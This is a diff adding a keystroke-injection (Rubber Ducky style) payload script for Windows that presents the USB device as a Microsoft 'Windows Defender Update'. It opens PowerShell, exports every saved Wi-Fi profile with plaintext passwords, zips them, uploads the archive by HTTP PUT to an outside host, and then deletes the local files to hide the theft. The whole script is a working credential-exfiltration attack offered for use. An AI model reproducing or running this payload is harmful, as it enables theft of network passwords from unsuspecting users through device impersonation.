@@ -1,0 +1,42 @@
+REM =========
+REM | Win-Get_SSID_Info-HTTP
+REM |
+REM | This script will gather the user's Wifi SSID profiles (including any PSK's/passcodes), zip them up,
+REM | then upload them to some public HTTP server via PUT.
+REM |
+REM | This does require you setting up a HTTP server to receive the files, see comments in the script lines.
+REM |
+REM | See all "REM ~~" tilde lines below for code that needs to be modified!
+REM |
+REM | Based on ideas from dantedmc4 / Dante Sparda
+REM | https://github.com/dantedmc4/poundplay
+REM |
+REM | Written by JeffTadashi
+REM | https://github.com/JeffTadashi/omducky/
+REM |
+VID 045E
+PID 0048
+MAN Microsoft
+PRO Windows Defender Update
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 2000
+REM | Export wlan profiles into xml files (including clear-test PSK's) into current directory
+STRING netsh wlan export profile key=clear
+ENTER
+REM | Collect all xml files into a single zip file
+STRING Compress-Archive -U -Path .\*.xml -DestinationPath temp.zip
+ENTER
+DELAY 3000
+STRING Invoke-Restmethod -Uri http://theboss.lol/temp.zip -Method Put -Infile .\temp.zip
+ENTER
+DELAY 2000
+REM | File cleanup and exit...
+STRING rm .\temp.zip
+ENTER
+STRING rm .\*.xml
+ENTER
+STRING exit
+ENTER
